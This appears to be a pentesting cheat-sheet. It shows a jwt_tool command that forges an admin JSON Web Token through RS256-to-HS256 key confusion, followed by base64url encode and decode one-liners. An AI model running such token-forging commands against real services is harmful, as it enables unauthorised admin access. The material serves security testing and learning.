```shell
docker run -it --network "host" --rm -v "${PWD}:/tmp" \
-v "${HOME}/.jwt_tool:/root/.jwt_tool" \
ticarpi/jwt_tool \
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpYXQiOjE3ODA3MjczODksImV4cCI6MTc4MDczMDk4OX0.tK6lo4wg3M9Nwb2F09YI-V_p3Op1tVV4cXgBa88-t904ivbjcKI4kElZFRf1v0b9PKRJ30IdYK7ivLQuv9BMHu-b2E_Z4UVBbO5CoEVN79CrOULJnpTwInvTcYL7oBZ4jnRd8fwAzV1ayfpzNSQgR_8AiFYWXpsXAnlLY37LMjRYNl72EZlWrEDyeRjfg_i1vgpfBa15lycRbTkd58BERdrM3a-UoxNv9ktu-Zr0wI_IXz3xSaFKj7zcbRbtHUTS6jE2FY_-lF443glV83JZgR2KL6VMJodYtN8hitqHpDychVr6Gm8GZ6sj4r5JBO4dswsZkazOEIq3eG3mekNLhA \
-pc username=admin -pc sub=1 -X k -pk /tmp/public.pem -vv
```
```shell
encode: echo -n $PAYLOAD | base64 -w 0 | tr '+/' '-_' | tr -d '='
decode header: echo "$JWT" | cut -d '.' -f1 | tr '_-' '/+' | base64 -d
decode payload: echo "$JWT" | cut -d '.' -f2 | tr '_-' '/+' | base64 -d
```
